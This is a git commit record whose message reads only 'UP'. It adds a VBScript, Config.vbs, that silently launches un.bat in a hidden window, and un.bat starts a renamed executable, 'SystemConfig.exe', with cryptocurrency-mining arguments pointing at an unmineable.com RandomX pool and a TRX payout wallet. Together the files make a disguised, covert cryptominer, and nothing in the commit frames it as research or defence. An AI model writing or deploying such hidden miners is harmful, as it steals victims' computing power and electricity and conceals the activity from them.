fd49d11e7682f6ddd15ae40eacf4190470c31991
MigZam <mz39729@gmail.com>
2023-11-27 16:13:50 -0500

    UP

---
+++ Config.vbs
@@ -0,0 +1,3 @@
+set WshShell=CreateObject("WScript.Shell")
+WshShell.run chr(34) & "un.bat" & Chr(34), 0
+set WshShell=Nothing
---
+++ un.bat
@@ -0,0 +1,2 @@
+SystemConfig.exe -a rx -o stratum+ssl://rx.unmineable.com:443 -u TRX:TXS8K8xHgcbwBnNYhzjG4BDLqnpjp1oJ5D.PC57#b3zc-w30r -p x --cpu-priority=5
+pause
